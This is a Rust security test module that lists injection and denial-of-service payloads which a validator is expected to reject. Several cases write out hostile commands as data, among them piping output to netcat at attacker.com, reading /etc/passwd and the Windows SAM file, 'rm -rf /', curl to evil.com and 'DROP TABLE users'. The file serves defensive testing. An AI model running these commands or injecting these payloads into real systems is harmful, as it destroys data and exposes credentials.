//! ABOUTME: Input validation security tests for malicious payload detection
//! ABOUTME: Tests for injection attacks, buffer overflows, and malformed input

use super::test_framework::*;
use serde_json::json;

/// SQL injection test vectors
#[must_use]
pub fn sql_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "SQL_UNION_SELECT".to_string(),
            description: "Union-based SQL injection".to_string(),
            payload: json!({
                "input": "1' UNION SELECT password FROM users--",
                "field": "id"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_BOOLEAN_BLIND".to_string(),
            description: "Boolean-based blind SQL injection".to_string(),
            payload: json!({
                "input": "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "field": "search"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_TIME_BLIND".to_string(),
            description: "Time-based blind SQL injection".to_string(),
            payload: json!({
                "input": "1'; WAITFOR DELAY '00:00:10'--",
                "field": "id"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_COMMENT_BYPASS".to_string(),
            description: "SQL comment bypass".to_string(),
            payload: json!({
                "input": "admin'/**/OR/**/1=1#",
                "field": "username"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_STACKED_QUERY".to_string(),
            description: "Stacked query injection".to_string(),
            payload: json!({
                "input": "1; DROP TABLE users; --",
                "field": "id"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// `NoSQL` injection test vectors
#[must_use]
pub fn nosql_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "NOSQL_MONGO_OR".to_string(),
            description: "MongoDB $or injection".to_string(),
            payload: json!({
                "input": {"$or": [{"password": {"$regex": ".*"}}, {"admin": true}]},
                "field": "query"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "NOSQL_MONGO_WHERE".to_string(),
            description: "MongoDB $where injection".to_string(),
            payload: json!({
                "input": {"$where": "function() { return true; }"},
                "field": "filter"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "NOSQL_REGEX_DOS".to_string(),
            description: "NoSQL regex DoS".to_string(),
            payload: json!({
                "input": {"username": {"$regex": "(.*a){100}"}},
                "field": "search"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection, TestCategory::DoS],
        },
    ]
}

/// Command injection test vectors
#[must_use]
pub fn command_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "CMD_SEMICOLON_UNIX".to_string(),
            description: "Unix command chaining".to_string(),
            payload: json!({
                "input": "file.txt; cat /etc/passwd",
                "field": "filename"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_PIPE_UNIX".to_string(),
            description: "Unix pipe injection".to_string(),
            payload: json!({
                "input": "file.txt | nc attacker.com 4444",
                "field": "filename"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_BACKTICK_UNIX".to_string(),
            description: "Unix backtick execution".to_string(),
            payload: json!({
                "input": "file.txt`whoami`.log",
                "field": "filename"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_DOLLAR_UNIX".to_string(),
            description: "Unix dollar expansion".to_string(),
            payload: json!({
                "input": "file$(id).txt",
                "field": "filename"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_AMPERSAND_WINDOWS".to_string(),
            description: "Windows command chaining".to_string(),
            payload: json!({
                "input": "file.txt & type C:\\Windows\\System32\\config\\SAM",
                "field": "filename"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// LDAP injection test vectors
#[must_use]
pub fn ldap_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "LDAP_WILDCARD".to_string(),
            description: "LDAP wildcard injection".to_string(),
            payload: json!({
                "input": "*)(uid=*))(|(uid=*",
                "field": "username"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "LDAP_BLIND".to_string(),
            description: "LDAP blind injection".to_string(),
            payload: json!({
                "input": "admin)(|(password=*",
                "field": "username"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// `XPath` injection test vectors
#[must_use]
pub fn xpath_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "XPATH_BOOLEAN".to_string(),
            description: "XPath boolean injection".to_string(),
            payload: json!({
                "input": "' or '1'='1",
                "field": "search"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "XPATH_EXTRACT".to_string(),
            description: "XPath data extraction".to_string(),
            payload: json!({
                "input": "' or count(//user)=1 or ''='",
                "field": "query"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Script injection test vectors
#[must_use]
pub fn script_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "SCRIPT_JAVASCRIPT".to_string(),
            description: "JavaScript injection".to_string(),
            payload: json!({
                "input": "<script>alert('XSS')</script>",
                "field": "comment"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SCRIPT_PYTHON_EVAL".to_string(),
            description: "Python eval injection".to_string(),
            payload: json!({
                "input": "__import__('os').system('rm -rf /')",
                "field": "expression"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SCRIPT_PYTHON_EXEC".to_string(),
            description: "Python exec injection".to_string(),
            payload: json!({
                "input": "exec('import subprocess; subprocess.call([\"curl\", \"evil.com\"])')",
                "field": "code"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Buffer overflow test vectors
#[must_use]
pub fn buffer_overflow_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "BUFFER_LONG_STRING".to_string(),
            description: "Extremely long string".to_string(),
            payload: json!({
                "input": "A".repeat(100_000),
                "field": "text"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::DoS],
        },
        SecurityTestCase {
            name: "BUFFER_FORMAT_STRING".to_string(),
            description: "Format string attack".to_string(),
            payload: json!({
                "input": "%s%s%s%s%s%s%s%s%s%s",
                "field": "format"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::DoS],
        },
        SecurityTestCase {
            name: "BUFFER_NULL_BYTES".to_string(),
            description: "Null byte injection".to_string(),
            payload: json!({
                "input": "normal\0malicious",
                "field": "data"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Malformed input test vectors
#[must_use]
pub fn malformed_input_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "MALFORMED_JSON_NESTED".to_string(),
            description: "Deeply nested JSON".to_string(),
            payload: json!({
                "input": "{".repeat(10000) + &"}".repeat(10000),
                "field": "json_data"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::DoS],
        },
        SecurityTestCase {
            name: "MALFORMED_XML_BILLION_LAUGHS".to_string(),
            description: "XML billion laughs attack".to_string(),
            payload: json!({
                "input": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>",
                "field": "xml_data"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::DoS],
        },
        SecurityTestCase {
            name: "MALFORMED_UNICODE_OVERLONG".to_string(),
            description: "Unicode overlong encoding".to_string(),
            payload: json!({
                "input": "\u{C0}\u{AF}",
                "field": "text"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Low,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "MALFORMED_CONTROL_CHARS".to_string(),
            description: "Control character injection".to_string(),
            payload: json!({
                "input": "\x00\x01\x02\x03\x04\x05\x06\x07",
                "field": "data"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Low,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Regular expression `DoS` test vectors
#[must_use]
pub fn regex_dos_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "REGEX_CATASTROPHIC_BACKTRACK".to_string(),
            description: "Catastrophic backtracking".to_string(),
            payload: json!({
                "input": "a".repeat(100) + "X",
                "pattern": "(a+)+$"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::DoS],
        },
        SecurityTestCase {
            name: "REGEX_EXPONENTIAL_TIME".to_string(),
            description: "Exponential time complexity".to_string(),
            payload: json!({
                "input": "a".repeat(50),
                "pattern": "(a|a)*"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::DoS],
        },
    ]
}

/// Protocol-specific injection tests
#[must_use]
pub fn protocol_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "PROTO_HTTP_HEADER".to_string(),
            description: "HTTP header injection".to_string(),
            payload: json!({
                "input": "value\r\nX-Injected: malicious",
                "field": "header_value"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "PROTO_EMAIL_HEADER".to_string(),
            description: "Email header injection".to_string(),
            payload: json!({
                "input": "user@domain.com\nBcc: attacker@evil.com",
                "field": "email"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "PROTO_SMTP_COMMAND".to_string(),
            description: "SMTP command injection".to_string(),
            payload: json!({
                "input": "user@domain.com\nDATA\nFrom: attacker@evil.com",
                "field": "recipient"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Create all input validation test cases
#[must_use]
pub fn all_input_validation_tests() -> Vec<SecurityTestCase> {
    let mut tests = Vec::new();
    tests.extend(sql_injection_tests());
    tests.extend(nosql_injection_tests());
    tests.extend(command_injection_tests());
    tests.extend(ldap_injection_tests());
    tests.extend(xpath_injection_tests());
    tests.extend(script_injection_tests());
    tests.extend(buffer_overflow_tests());
    tests.extend(malformed_input_tests());
    tests.extend(regex_dos_tests());
    tests.extend(protocol_injection_tests());
    tests
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_input_validation_test_creation() {
        let tests = all_input_validation_tests();
        assert!(!tests.is_empty());

        // Verify we have tests from each category
        let categories: Vec<String> = tests
            .iter()
            .map(|t| t.name.split('_').next().unwrap_or(""))
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .map(std::string::ToString::to_string)
            .collect();

        assert!(categories.contains(&"SQL".to_string()));
        assert!(categories.contains(&"NOSQL".to_string()));
        assert!(categories.contains(&"CMD".to_string()));
        assert!(categories.contains(&"LDAP".to_string()));
        assert!(categories.contains(&"XPATH".to_string()));
        assert!(categories.contains(&"SCRIPT".to_string()));
        assert!(categories.contains(&"BUFFER".to_string()));
        assert!(categories.contains(&"MALFORMED".to_string()));
        assert!(categories.contains(&"REGEX".to_string()));
        assert!(categories.contains(&"PROTO".to_string()));
    }
    #[test]
    fn test_critical_severity_tests() {
        let tests = all_input_validation_tests();
        let critical_tests: Vec<_> = tests
            .iter()
            .filter(|t| t.severity == Severity::Critical)
            .collect();

        // Should have critical severity tests for dangerous injections
        assert!(!critical_tests.is_empty());

        // SQL stacked queries should be critical
        assert!(critical_tests.iter().any(|t| t.name == "SQL_STACKED_QUERY"));

        // Command injection should be critical
        assert!(critical_tests.iter().any(|t| t.name.starts_with("CMD_")));
    }
    #[test]
    fn test_injection_category_coverage() {
        let tests = all_input_validation_tests();
        let injection_test_count = tests
            .iter()
            .filter(|t| t.categories.contains(&TestCategory::Injection))
            .count();

        // Should have comprehensive injection test coverage
        assert!(injection_test_count > 20);
    }
}
